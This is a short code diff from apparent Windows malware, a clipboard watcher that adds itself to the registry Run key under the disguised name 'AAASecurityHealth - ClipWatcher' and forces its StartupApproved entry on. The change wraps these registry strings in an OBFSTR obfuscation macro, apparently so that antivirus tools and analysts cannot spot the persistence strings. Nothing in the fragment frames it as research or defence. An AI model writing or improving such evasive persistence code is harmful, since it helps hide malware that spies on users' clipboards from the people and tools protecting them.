@@ -6,6 +6,7 @@
 #include <cstring>
 #include <iostream>
 #include <iomanip>
+#include <obfstr.h>
 #include "aes.h"
 
 std::string WStringToUtf8(const std::wstring& wstr)
@@ -27,10 +28,10 @@ std::string WStringToUtf8(const std::wstring& wstr)
 
 void AddToStartup() {
     HKEY hKey;
-    const char* runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-    const char* valueName = "AAASecurityHealth - ClipWatcher";
+    const char* runKey = OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+    const char* valueName = OBFSTR("AAASecurityHealth - ClipWatcher");
 
-    const char* approvedKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run";
+    const char* approvedKey = OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run");
     BYTE enabled[] = { 0x03, 0x00, 0x00, 0x00 };
 
     char exePath[MAX_PATH];
